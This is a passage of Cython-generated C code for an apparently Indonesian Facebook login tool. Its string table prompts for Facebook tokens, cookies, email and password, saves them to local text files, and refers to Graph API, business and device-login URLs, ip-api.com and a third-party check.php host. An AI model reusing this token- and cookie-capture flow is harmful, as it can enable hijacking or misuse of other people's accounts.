  {&__pyx_kp_u_data_token_txt, __pyx_k_data_token_txt, sizeof(__pyx_k_data_token_txt), 0, 1, 0, 0},
  {&__pyx_n_s_datawaktu, __pyx_k_datawaktu, sizeof(__pyx_k_datawaktu), 0, 0, 1, 1},
  {&__pyx_n_s_date, __pyx_k_date, sizeof(__pyx_k_date), 0, 0, 1, 1},
  {&__pyx_n_s_date_format, __pyx_k_date_format, sizeof(__pyx_k_date_format), 0, 0, 1, 1},
  {&__pyx_n_s_datetime, __pyx_k_datetime, sizeof(__pyx_k_datetime), 0, 0, 1, 1},
  {&__pyx_kp_u_datr, __pyx_k_datr, sizeof(__pyx_k_datr), 0, 1, 0, 0},
  {&__pyx_n_u_datr_2, __pyx_k_datr_2, sizeof(__pyx_k_datr_2), 0, 1, 0, 1},
  {&__pyx_n_s_day, __pyx_k_day, sizeof(__pyx_k_day), 0, 0, 1, 1},
  {&__pyx_n_s_day_name, __pyx_k_day_name, sizeof(__pyx_k_day_name), 0, 0, 1, 1},
  {&__pyx_n_s_days, __pyx_k_days, sizeof(__pyx_k_days), 0, 0, 1, 1},
  {&__pyx_n_u_december, __pyx_k_december, sizeof(__pyx_k_december), 0, 1, 0, 1},
  {&__pyx_kp_u_deep_pink3, __pyx_k_deep_pink3, sizeof(__pyx_k_deep_pink3), 0, 1, 0, 0},
  {&__pyx_n_s_delta, __pyx_k_delta, sizeof(__pyx_k_delta), 0, 0, 1, 1},
  {&__pyx_n_u_desember, __pyx_k_desember, sizeof(__pyx_k_desember), 0, 1, 0, 1},
  {&__pyx_kp_u_dev, __pyx_k_dev, sizeof(__pyx_k_dev), 0, 1, 0, 0},
  {&__pyx_n_s_device, __pyx_k_device, sizeof(__pyx_k_device), 0, 0, 1, 1},
  {&__pyx_kp_u_device_Alamat_IP, __pyx_k_device_Alamat_IP, sizeof(__pyx_k_device_Alamat_IP), 0, 1, 0, 0},
  {&__pyx_n_u_dnt, __pyx_k_dnt, sizeof(__pyx_k_dnt), 0, 1, 0, 1},
  {&__pyx_n_u_document, __pyx_k_document, sizeof(__pyx_k_document), 0, 1, 0, 1},
  {&__pyx_n_s_dump, __pyx_k_dump, sizeof(__pyx_k_dump), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
  {&__pyx_n_u_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 1, 0, 1},
  {&__pyx_n_u_empty, __pyx_k_empty, sizeof(__pyx_k_empty), 0, 1, 0, 1},
  {&__pyx_kp_u_en_GB_en_US_q_0_9_en_q_0_8, __pyx_k_en_GB_en_US_q_0_9_en_q_0_8, sizeof(__pyx_k_en_GB_en_US_q_0_9_en_q_0_8), 0, 1, 0, 0},
  {&__pyx_n_s_exceptions, __pyx_k_exceptions, sizeof(__pyx_k_exceptions), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exp, __pyx_k_exp, sizeof(__pyx_k_exp), 0, 0, 1, 1},
  {&__pyx_n_u_expired, __pyx_k_expired, sizeof(__pyx_k_expired), 0, 1, 0, 1},
  {&__pyx_n_u_february, __pyx_k_february, sizeof(__pyx_k_february), 0, 1, 0, 1},
  {&__pyx_n_s_find_token, __pyx_k_find_token, sizeof(__pyx_k_find_token), 0, 0, 1, 1},
  {&__pyx_n_s_findall, __pyx_k_findall, sizeof(__pyx_k_findall), 0, 0, 1, 1},
  {&__pyx_n_u_flow, __pyx_k_flow, sizeof(__pyx_k_flow), 0, 1, 0, 1},
  {&__pyx_kp_u_fr, __pyx_k_fr, sizeof(__pyx_k_fr), 0, 1, 0, 0},
  {&__pyx_n_u_fr_2, __pyx_k_fr_2, sizeof(__pyx_k_fr_2), 0, 1, 0, 1},
  {&__pyx_n_s_freetoken, __pyx_k_freetoken, sizeof(__pyx_k_freetoken), 0, 0, 1, 1},
  {&__pyx_n_s_freetokenv1, __pyx_k_freetokenv1, sizeof(__pyx_k_freetokenv1), 0, 0, 1, 1},
  {&__pyx_n_s_freetokenv2, __pyx_k_freetokenv2, sizeof(__pyx_k_freetokenv2), 0, 0, 1, 1},
  {&__pyx_n_s_garis, __pyx_k_garis, sizeof(__pyx_k_garis), 0, 0, 1, 1},
  {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
  {&__pyx_n_s_get_cookie, __pyx_k_get_cookie, sizeof(__pyx_k_get_cookie), 0, 0, 1, 1},
  {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
  {&__pyx_n_s_get_token, __pyx_k_get_token, sizeof(__pyx_k_get_token), 0, 0, 1, 1},
  {&__pyx_kp_u_green, __pyx_k_green, sizeof(__pyx_k_green), 0, 1, 0, 0},
  {&__pyx_n_s_group, __pyx_k_group, sizeof(__pyx_k_group), 0, 0, 1, 1},
  {&__pyx_n_s_grup_tanpalogin, __pyx_k_grup_tanpalogin, sizeof(__pyx_k_grup_tanpalogin), 0, 0, 1, 1},
  {&__pyx_kp_u_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 1, 0, 0},
  {&__pyx_kp_u_gzip_deflate_br, __pyx_k_gzip_deflate_br, sizeof(__pyx_k_gzip_deflate_br), 0, 1, 0, 0},
  {&__pyx_n_s_ha, __pyx_k_ha, sizeof(__pyx_k_ha), 0, 0, 1, 1},
  {&__pyx_n_s_headcok, __pyx_k_headcok, sizeof(__pyx_k_headcok), 0, 0, 1, 1},
  {&__pyx_n_s_header, __pyx_k_header, sizeof(__pyx_k_header), 0, 0, 1, 1},
  {&__pyx_n_s_header1, __pyx_k_header1, sizeof(__pyx_k_header1), 0, 0, 1, 1},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_u_host, __pyx_k_host, sizeof(__pyx_k_host), 0, 1, 0, 1},
  {&__pyx_n_s_hr, __pyx_k_hr, sizeof(__pyx_k_hr), 0, 0, 1, 1},
  {&__pyx_kp_u_html_parser, __pyx_k_html_parser, sizeof(__pyx_k_html_parser), 0, 1, 0, 0},
  {&__pyx_kp_u_http_ip_api_com_json, __pyx_k_http_ip_api_com_json, sizeof(__pyx_k_http_ip_api_com_json), 0, 1, 0, 0},
  {&__pyx_kp_u_https, __pyx_k_https, sizeof(__pyx_k_https), 0, 1, 0, 0},
  {&__pyx_kp_u_https_business_facebook_com, __pyx_k_https_business_facebook_com, sizeof(__pyx_k_https_business_facebook_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_business_facebook_com_busi, __pyx_k_https_business_facebook_com_busi, sizeof(__pyx_k_https_business_facebook_com_busi), 0, 1, 0, 0},
  {&__pyx_kp_u_https_developers_facebook_com_to, __pyx_k_https_developers_facebook_com_to, sizeof(__pyx_k_https_developers_facebook_com_to), 0, 1, 0, 0},
  {&__pyx_kp_u_https_fall_xavier_my_id_check_ph, __pyx_k_https_fall_xavier_my_id_check_ph, sizeof(__pyx_k_https_fall_xavier_my_id_check_ph), 0, 1, 0, 0},
  {&__pyx_kp_u_https_free_facebook_com_10004070, __pyx_k_https_free_facebook_com_10004070, sizeof(__pyx_k_https_free_facebook_com_10004070), 0, 1, 0, 0},
  {&__pyx_kp_u_https_graph_facebook_com_me_acce, __pyx_k_https_graph_facebook_com_me_acce, sizeof(__pyx_k_https_graph_facebook_com_me_acce), 0, 1, 0, 0},
  {&__pyx_kp_u_https_graph_facebook_com_me_acce_2, __pyx_k_https_graph_facebook_com_me_acce_2, sizeof(__pyx_k_https_graph_facebook_com_me_acce_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_m_facebook_com, __pyx_k_https_m_facebook_com, sizeof(__pyx_k_https_m_facebook_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_m_facebook_com_index_php_n, __pyx_k_https_m_facebook_com_index_php_n, sizeof(__pyx_k_https_m_facebook_com_index_php_n), 0, 1, 0, 0},
  {&__pyx_kp_u_https_m_facebook_com_login_devic, __pyx_k_https_m_facebook_com_login_devic, sizeof(__pyx_k_https_m_facebook_com_login_devic), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_facebook_com, __pyx_k_https_www_facebook_com, sizeof(__pyx_k_https_www_facebook_com), 0, 1, 0, 0},
  {&__pyx_kp_u_id_ID_id_q_0_9_en_US_q_0_8_en_q, __pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q, sizeof(__pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q), 0, 1, 0, 0},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_u_januari, __pyx_k_januari, sizeof(__pyx_k_januari), 0, 1, 0, 1},
  {&__pyx_n_u_january, __pyx_k_january, sizeof(__pyx_k_january), 0, 1, 0, 1},
  {&__pyx_n_u_jazoest, __pyx_k_jazoest, sizeof(__pyx_k_jazoest), 0, 1, 0, 1},
  {&__pyx_n_u_join, __pyx_k_join, sizeof(__pyx_k_join), 0, 1, 0, 1},
  {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
  {&__pyx_n_u_juli, __pyx_k_juli, sizeof(__pyx_k_juli), 0, 1, 0, 1},
  {&__pyx_n_u_july, __pyx_k_july, sizeof(__pyx_k_july), 0, 1, 0, 1},
  {&__pyx_n_u_june, __pyx_k_june, sizeof(__pyx_k_june), 0, 1, 0, 1},
  {&__pyx_n_u_juni, __pyx_k_juni, sizeof(__pyx_k_juni), 0, 1, 0, 1},
  {&__pyx_n_u_kadaluarsa, __pyx_k_kadaluarsa, sizeof(__pyx_k_kadaluarsa), 0, 1, 0, 1},
  {&__pyx_n_s_kadaluwarsa, __pyx_k_kadaluwarsa, sizeof(__pyx_k_kadaluwarsa), 0, 0, 1, 1},
  {&__pyx_n_s_kredensial, __pyx_k_kredensial, sizeof(__pyx_k_kredensial), 0, 0, 1, 1},
  {&__pyx_kp_u_limit_device, __pyx_k_limit_device, sizeof(__pyx_k_limit_device), 0, 1, 0, 0},
  {&__pyx_n_s_login, __pyx_k_login, sizeof(__pyx_k_login), 0, 0, 1, 1},
  {&__pyx_n_u_login_no_pin, __pyx_k_login_no_pin, sizeof(__pyx_k_login_no_pin), 0, 1, 0, 1},
  {&__pyx_kp_s_login_py, __pyx_k_login_py, sizeof(__pyx_k_login_py), 0, 0, 1, 0},
  {&__pyx_n_s_logo, __pyx_k_logo, sizeof(__pyx_k_logo), 0, 0, 1, 1},
  {&__pyx_n_u_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 1, 0, 1},
  {&__pyx_kp_u_m_facebook_com, __pyx_k_m_facebook_com, sizeof(__pyx_k_m_facebook_com), 0, 1, 0, 0},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_u_march, __pyx_k_march, sizeof(__pyx_k_march), 0, 1, 0, 1},
  {&__pyx_kp_u_mark_via_gp, __pyx_k_mark_via_gp, sizeof(__pyx_k_mark_via_gp), 0, 1, 0, 0},
  {&__pyx_kp_u_masukan_cookie_fb, __pyx_k_masukan_cookie_fb, sizeof(__pyx_k_masukan_cookie_fb), 0, 1, 0, 0},
  {&__pyx_kp_u_masukan_token_fb, __pyx_k_masukan_token_fb, sizeof(__pyx_k_masukan_token_fb), 0, 1, 0, 0},
  {&__pyx_kp_u_max_age_0, __pyx_k_max_age_0, sizeof(__pyx_k_max_age_0), 0, 1, 0, 0},
  {&__pyx_n_u_may, __pyx_k_may, sizeof(__pyx_k_may), 0, 1, 0, 1},
  {&__pyx_n_u_mei, __pyx_k_mei, sizeof(__pyx_k_mei), 0, 1, 0, 1},
  {&__pyx_n_s_menu, __pyx_k_menu, sizeof(__pyx_k_menu), 0, 0, 1, 1},
  {&__pyx_n_s_menu_apikey, __pyx_k_menu_apikey, sizeof(__pyx_k_menu_apikey), 0, 0, 1, 1},
  {&__pyx_n_s_menulain, __pyx_k_menulain, sizeof(__pyx_k_menulain), 0, 0, 1, 1},
  {&__pyx_n_s_month, __pyx_k_month, sizeof(__pyx_k_month), 0, 0, 1, 1},
  {&__pyx_n_s_my_date, __pyx_k_my_date, sizeof(__pyx_k_my_date), 0, 0, 1, 1},
  {&__pyx_n_s_n, __pyx_k_n, sizeof(__pyx_k_n), 0, 0, 1, 1},
  {&__pyx_n_s_nTemp, __pyx_k_nTemp, sizeof(__pyx_k_nTemp), 0, 0, 1, 1},
  {&__pyx_n_s_nama, __pyx_k_nama, sizeof(__pyx_k_nama), 0, 0, 1, 1},
  {&__pyx_n_u_nama, __pyx_k_nama, sizeof(__pyx_k_nama), 0, 1, 0, 1},
  {&__pyx_n_s_nama_hari, __pyx_k_nama_hari, sizeof(__pyx_k_nama_hari), 0, 0, 1, 1},
  {&__pyx_n_u_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 1, 0, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_kp_u_name_jazoest_value, __pyx_k_name_jazoest_value, sizeof(__pyx_k_name_jazoest_value), 0, 1, 0, 0},
  {&__pyx_kp_u_name_lsd_value, __pyx_k_name_lsd_value, sizeof(__pyx_k_name_lsd_value), 0, 1, 0, 0},
  {&__pyx_n_u_next, __pyx_k_next, sizeof(__pyx_k_next), 0, 1, 0, 1},
  {&__pyx_n_u_november, __pyx_k_november, sizeof(__pyx_k_november), 0, 1, 0, 1},
  {&__pyx_n_s_now, __pyx_k_now, sizeof(__pyx_k_now), 0, 0, 1, 1},
  {&__pyx_n_s_num, __pyx_k_num, sizeof(__pyx_k_num), 0, 0, 1, 1},
  {&__pyx_n_u_october, __pyx_k_october, sizeof(__pyx_k_october), 0, 1, 0, 1},
  {&__pyx_n_u_oktober, __pyx_k_oktober, sizeof(__pyx_k_oktober), 0, 1, 0, 1},
  {&__pyx_n_s_op, __pyx_k_op, sizeof(__pyx_k_op), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_u_origin, __pyx_k_origin, sizeof(__pyx_k_origin), 0, 1, 0, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_parser, __pyx_k_parser, sizeof(__pyx_k_parser), 0, 0, 1, 1},
  {&__pyx_n_u_pass, __pyx_k_pass, sizeof(__pyx_k_pass), 0, 1, 0, 1},
  {&__pyx_n_s_pencarian_nologin, __pyx_k_pencarian_nologin, sizeof(__pyx_k_pencarian_nologin), 0, 0, 1, 1},
  {&__pyx_n_s_pil, __pyx_k_pil, sizeof(__pyx_k_pil), 0, 0, 1, 1},
  {&__pyx_n_s_platform, __pyx_k_platform, sizeof(__pyx_k_platform), 0, 0, 1, 1},
  {&__pyx_n_s_po, __pyx_k_po, sizeof(__pyx_k_po), 0, 0, 1, 1},
  {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_prints, __pyx_k_prints, sizeof(__pyx_k_prints), 0, 0, 1, 1},
  {&__pyx_n_s_pw, __pyx_k_pw, sizeof(__pyx_k_pw), 0, 0, 1, 1},
  {&__pyx_n_u_query, __pyx_k_query, sizeof(__pyx_k_query), 0, 1, 0, 1},
  {&__pyx_n_s_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 0, 1, 1},
  {&__pyx_n_u_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 1, 0, 1},
  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
  {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
  {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
  {&__pyx_n_u_readtext, __pyx_k_readtext, sizeof(__pyx_k_readtext), 0, 1, 0, 1},
  {&__pyx_n_s_real_time, __pyx_k_real_time, sizeof(__pyx_k_real_time), 0, 0, 1, 1},
  {&__pyx_kp_u_red, __pyx_k_red, sizeof(__pyx_k_red), 0, 1, 0, 0},
  {&__pyx_n_u_referer, __pyx_k_referer, sizeof(__pyx_k_referer), 0, 1, 0, 1},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
  {&__pyx_n_s_rich, __pyx_k_rich, sizeof(__pyx_k_rich), 0, 0, 1, 1},
  {&__pyx_n_s_rich_panel, __pyx_k_rich_panel, sizeof(__pyx_k_rich_panel), 0, 0, 1, 1},
  {&__pyx_n_s_rich_tree, __pyx_k_rich_tree, sizeof(__pyx_k_rich_tree), 0, 0, 1, 1},
  {&__pyx_kp_u_rm_f_data_token_txt, __pyx_k_rm_f_data_token_txt, sizeof(__pyx_k_rm_f_data_token_txt), 0, 1, 0, 0},
  {&__pyx_kp_u_rm_f_data_token_txt_data_cookie, __pyx_k_rm_f_data_token_txt_data_cookie, sizeof(__pyx_k_rm_f_data_token_txt_data_cookie), 0, 1, 0, 0},
  {&__pyx_kp_u_s, __pyx_k_s, sizeof(__pyx_k_s), 0, 1, 0, 0},
  {&__pyx_kp_u_same_origin, __pyx_k_same_origin, sizeof(__pyx_k_same_origin), 0, 1, 0, 0},
  {&__pyx_n_s_search, __pyx_k_search, sizeof(__pyx_k_search), 0, 0, 1, 1},
  {&__pyx_kp_u_sec_fetch_dest, __pyx_k_sec_fetch_dest, sizeof(__pyx_k_sec_fetch_dest), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_mode, __pyx_k_sec_fetch_mode, sizeof(__pyx_k_sec_fetch_mode), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_site, __pyx_k_sec_fetch_site, sizeof(__pyx_k_sec_fetch_site), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_user, __pyx_k_sec_fetch_user, sizeof(__pyx_k_sec_fetch_user), 0, 1, 0, 0},
  {&__pyx_n_u_september, __pyx_k_september, sizeof(__pyx_k_september), 0, 1, 0, 1},
  {&__pyx_n_s_ses, __pyx_k_ses, sizeof(__pyx_k_ses), 0, 0, 1, 1},
  {&__pyx_n_s_sisahari, __pyx_k_sisahari, sizeof(__pyx_k_sisahari), 0, 0, 1, 1},
  {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_src, __pyx_k_src, sizeof(__pyx_k_src), 0, 0, 1, 1},
  {&__pyx_n_s_status, __pyx_k_status, sizeof(__pyx_k_status), 0, 0, 1, 1},
  {&__pyx_n_u_status, __pyx_k_status, sizeof(__pyx_k_status), 0, 1, 0, 1},
  {&__pyx_n_s_strptime, __pyx_k_strptime, sizeof(__pyx_k_strptime), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_ta, __pyx_k_ta, sizeof(__pyx_k_ta), 0, 0, 1, 1},
  {&__pyx_n_s_tanggal, __pyx_k_tanggal, sizeof(__pyx_k_tanggal), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
  {&__pyx_kp_u_text_html_application_xhtml_xml, __pyx_k_text_html_application_xhtml_xml, sizeof(__pyx_k_text_html_application_xhtml_xml), 0, 1, 0, 0},
  {&__pyx_kp_u_text_html_application_xhtml_xml_2, __pyx_k_text_html_application_xhtml_xml_2, sizeof(__pyx_k_text_html_application_xhtml_xml_2), 0, 1, 0, 0},
  {&__pyx_kp_u_text_html_charset_utf_8, __pyx_k_text_html_charset_utf_8, sizeof(__pyx_k_text_html_charset_utf_8), 0, 1, 0, 0},
  {&__pyx_n_s_tgl, __pyx_k_tgl, sizeof(__pyx_k_tgl), 0, 0, 1, 1},
  {&__pyx_kp_u_tidak_ada_koneksi_internet, __pyx_k_tidak_ada_koneksi_internet, sizeof(__pyx_k_tidak_ada_koneksi_internet), 0, 1, 0, 0},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_title, __pyx_k_title, sizeof(__pyx_k_title), 0, 0, 1, 1},
  {&__pyx_n_s_today, __pyx_k_today, sizeof(__pyx_k_today), 0, 0, 1, 1},
  {&__pyx_n_s_token, __pyx_k_token, sizeof(__pyx_k_token), 0, 0, 1, 1},
  {&__pyx_n_s_tolkau, __pyx_k_tolkau, sizeof(__pyx_k_tolkau), 0, 0, 1, 1},
  {&__pyx_n_u_uid, __pyx_k_uid, sizeof(__pyx_k_uid), 0, 1, 0, 1},
  {&__pyx_kp_u_upgrade_insecure_requests, __pyx_k_upgrade_insecure_requests, sizeof(__pyx_k_upgrade_insecure_requests), 0, 1, 0, 0},
  {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
  {&__pyx_n_u_usage, __pyx_k_usage, sizeof(__pyx_k_usage), 0, 1, 0, 1},
  {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
  {&__pyx_kp_u_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 1, 0, 0},
  {&__pyx_n_u_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 1, 0, 1},
  {&__pyx_n_s_weekday, __pyx_k_weekday, sizeof(__pyx_k_weekday), 0, 0, 1, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_kp_u_x_requested_with, __pyx_k_x_requested_with, sizeof(__pyx_k_x_requested_with), 0, 1, 0, 0},
  {&__pyx_kp_u_xs, __pyx_k_xs, sizeof(__pyx_k_xs), 0, 1, 0, 0},
  {&__pyx_n_u_xs_2, __pyx_k_xs_2, sizeof(__pyx_k_xs_2), 0, 1, 0, 1},
  {&__pyx_n_u_y, __pyx_k_y, sizeof(__pyx_k_y), 0, 1, 0, 1},
  {&__pyx_n_s_year, __pyx_k_year, sizeof(__pyx_k_year), 0, 0, 1, 1},
  {&__pyx_n_s_zz, __pyx_k_zz, sizeof(__pyx_k_zz), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 31, __pyx_L1_error)
  __pyx_builtin_ValueError = __Pyx_GetBuiltinName(__pyx_n_s_ValueError); if (!__pyx_builtin_ValueError) __PYX_ERR(0, 33, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 76, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 105, __pyx_L1_error)
  __pyx_builtin_KeyError = __Pyx_GetBuiltinName(__pyx_n_s_KeyError); if (!__pyx_builtin_KeyError) __PYX_ERR(0, 146, __pyx_L1_error)
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 148, __pyx_L1_error)
  __pyx_builtin_AttributeError = __Pyx_GetBuiltinName(__pyx_n_s_AttributeError); if (!__pyx_builtin_AttributeError) __PYX_ERR(0, 241, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple__2 = PyTuple_Pack(2, __pyx_kp_u_data_apikey_txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__2);
  __Pyx_GIVEREF(__pyx_tuple__2);

  
  __pyx_tuple__3 = PyTuple_Pack(1, __pyx_kp_u_bold_01_Login_Dengan_Token_06_B); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 100, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);

  
  __pyx_tuple__6 = PyTuple_Pack(1, __pyx_kp_u_Anda_bisa_mengambil_token_dengan); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 107, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__6);
  __Pyx_GIVEREF(__pyx_tuple__6);

  
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_u_masukan_token_fb); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 108, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);

  
  __pyx_tuple__8 = PyTuple_Pack(1, __pyx_kp_u_Anda_bisa_mengambil_cookie_denga); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 111, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__8);
  __Pyx_GIVEREF(__pyx_tuple__8);

  
  __pyx_tuple__9 = PyTuple_Pack(1, __pyx_kp_u_masukan_cookie_fb); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 112, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);

  
  __pyx_tuple__10 = PyTuple_Pack(1, __pyx_kp_u_Silahkan_masukkan_email_no_hp_id); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 115, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);

  
  __pyx_tuple__11 = PyTuple_Pack(1, __pyx_kp_u_Masukan_Email); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 116, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);

  
  __pyx_tuple__12 = PyTuple_Pack(1, __pyx_kp_u_Masukan_Sandi); if (unlikely(!__pyx_tuple__12)) __PYX_ERR(0, 117, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__12);
  __Pyx_GIVEREF(__pyx_tuple__12);

  
  __pyx_tuple__13 = PyTuple_Pack(1, __pyx_kp_u_apakah_kamu_ingin_menghapus_api); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 132, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__13);
  __Pyx_GIVEREF(__pyx_tuple__13);

  
  __pyx_tuple__14 = PyTuple_Pack(1, __pyx_kp_u_berhasil_menghapus_apikey); if (unlikely(!__pyx_tuple__14)) __PYX_ERR(0, 135, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__14);
  __Pyx_GIVEREF(__pyx_tuple__14);

  
  __pyx_tuple__15 = PyTuple_Pack(2, __pyx_kp_u_data_token_txt, __pyx_n_u_w); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 142, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

  
  __pyx_tuple__17 = PyTuple_Pack(1, __pyx_kp_u__16); if (unlikely(!__pyx_tuple__17)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__17);
  __Pyx_GIVEREF(__pyx_tuple__17);

  
  __pyx_tuple__18 = PyTuple_Pack(1, __pyx_kp_u_https_business_facebook_com_busi); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 154, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__18);
  __Pyx_GIVEREF(__pyx_tuple__18);

  
  __pyx_tuple__19 = PyTuple_Pack(2, __pyx_kp_u_data_cookie_txt, __pyx_n_u_w); if (unlikely(!__pyx_tuple__19)) __PYX_ERR(0, 158, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__19);
  __Pyx_GIVEREF(__pyx_tuple__19);

  
  __pyx_tuple__20 = PyTuple_Pack(1, __pyx_kp_u_https_m_facebook_com_index_php_n); if (unlikely(!__pyx_tuple__20)) __PYX_ERR(0, 218, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__20);
  __Pyx_GIVEREF(__pyx_tuple__20);

  
  __pyx_tuple__21 = PyTuple_Pack(1, __pyx_kp_u_https_m_facebook_com_login_devic); if (unlikely(!__pyx_tuple__21)) __PYX_ERR(0, 221, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__21);
  __Pyx_GIVEREF(__pyx_tuple__21);

  
  __pyx_tuple__24 = PyTuple_Pack(1, __pyx_kp_u_http_ip_api_com_json); if (unlikely(!__pyx_tuple__24)) __PYX_ERR(0, 45, __pyx_L1_error)
